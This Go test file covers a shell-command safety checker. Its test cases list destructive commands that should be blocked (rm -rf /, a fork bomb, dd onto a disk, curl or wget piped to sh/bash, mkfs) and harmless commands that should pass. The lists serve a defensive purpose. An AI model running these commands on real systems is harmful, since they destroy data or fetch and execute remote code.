package shellexec

import (
	"strings"
	"testing"
)

func TestCheckDangerousCommand_Blocks(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want string
	}{
		{"rm_rf_root", "rm -rf /", "rm_rf_root"},
		{"rm_rf_root_glob", "rm -rf /*", "rm_rf_root"},
		{"rm_rf_home_var", "rm -rf $HOME", "rm_rf_root"},
		{"rm_rf_etc", "rm -rf /etc", "rm_rf_root"},
		{"rm_rf_sudo", "sudo rm -rf /", "rm_rf_root"},
		{"fork_bomb_classic", ":(){:|:&};:", "fork_bomb"},
		{"fork_bomb_spaced", ":(){ :|: & };:", "fork_bomb"},
		{"dd_to_disk", "dd if=/dev/zero of=/dev/sda bs=1M", "dd_block_device"},
		{"redirect_etc", "echo hi > /etc/passwd", "redirect_system_path"},
		{"tee_etc", "cat foo | tee /etc/hosts", "redirect_system_path"},
		{"chmod_recursive_root", "chmod -R 777 /", "chmod_recursive_root"},
		{"chown_recursive_etc", "chown -R nobody /etc", "chown_recursive_root"},
		{"curl_pipe_sh", "curl http://x.y/bootstrap | sh", "remote_pipe_shell"},
		{"wget_pipe_bash", "wget -qO- http://x | bash", "remote_pipe_shell"},
		{"kill_pid_1", "kill -9 1", "kill_pid1"},
		{"iptables_flush", "iptables -F", "iptables_flush"},

		{"shutdown", "shutdown -h now", "shutdown"},
		{"reboot", "reboot", "reboot"},
		{"poweroff", "poweroff", "poweroff"},
		{"init_0", "init 0", "init"},
		{"mkfs", "mkfs.ext4 /dev/sdb1", "mkfs"},
		{"wipefs", "wipefs -a /dev/sdb", "wipefs"},
		{"fdisk", "fdisk /dev/sda", "fdisk"},
		{"useradd", "useradd foo", "useradd"},
		{"usermod", "sudo usermod -aG wheel foo", "usermod"},
		{"passwd", "passwd", "passwd"},
		{"visudo", "visudo", "visudo"},
		{"crontab", "crontab -r", "crontab"},
		{"ssh_keygen", "ssh-keygen -t ed25519", "ssh-keygen"},
		{"env_wrapped_shutdown", "env FOO=1 shutdown -h now", "shutdown"},
		{"piped_poweroff", "echo go && poweroff", "poweroff"},
		{"systemctl", "systemctl disable sshd", "systemctl"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := CheckDangerousCommand(tc.cmd)
			if err == nil {
				t.Fatalf("expected block for %q, got nil", tc.cmd)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("expected error to mention %q, got %v", tc.want, err)
			}
		})
	}
}

func TestCheckDangerousCommand_Allows(t *testing.T) {
	cases := []string{
		"",
		"  ",
		"echo hello",
		"ls -la",
		"cat /etc/passwd",       // 旧版本会被 "passwd" 子串命中，误伤；新版按命令名区分应放行
		"grep -r foo /etc/nginx", // 读取 /etc 应放行
		"tail -f /var/log/app.log",
		"python3 script.py --flag=--rm",
		"git status && git diff",
		"go test ./... | tee test.log",
		"find . -name '*.go' -type f",
		"curl -sSL https://example.com/data.json",   // 仅下载不管道到 sh
		"wget https://example.com/a.tar.gz -O a.tgz", // 仅下载
		"rm -rf ./build",                              // 相对路径不应拦
		"rm -rf node_modules",                         // 相对路径不应拦
		"chmod +x ./script.sh",                        // 未走 -R 到关键路径
		"chmod 755 ./bin/app",
		"kill 12345",           // 非 PID 1
		"killall 2>/dev/null || true", // killall 仍会拦，见 Blocks
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			if strings.Contains(cmd, "killall") {
				// killall 已在 blocklist，跳过
				t.Skip("killall is intentionally blocked")
			}
			if err := CheckDangerousCommand(cmd); err != nil {
				t.Fatalf("did not expect block for %q: %v", cmd, err)
			}
		})
	}
}

func TestSplitTopLevel(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"a && b", []string{"a", "b"}},
		{"a | b | c", []string{"a", "b", "c"}},
		{"a; b; c", []string{"a", "b", "c"}},
		{`echo "a | b" && ls`, []string{`echo "a | b"`, "ls"}},
		{`foo $(bar; baz) qux`, []string{"foo $(bar; baz) qux"}},
	}
	for _, tc := range cases {
		got := splitTopLevel(tc.in)
		if len(got) != len(tc.want) {
			t.Fatalf("splitTopLevel(%q) len=%d want=%d, got=%v", tc.in, len(got), len(tc.want), got)
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Fatalf("splitTopLevel(%q)[%d] = %q, want %q", tc.in, i, got[i], tc.want[i])
			}
		}
	}
}

func TestFirstCommandName(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"ls -la", "ls"},
		{"sudo rm -rf /", "rm"},
		{"env FOO=1 BAR=2 shutdown -h", "shutdown"},
		{"/usr/bin/python3 script.py", "python3"},
		{`"weird name" arg`, "weird name"},
		{"FOO=1 BAR=2", ""},
	}
	for _, tc := range cases {
		if got := firstCommandName(tc.in); got != tc.want {
			t.Errorf("firstCommandName(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
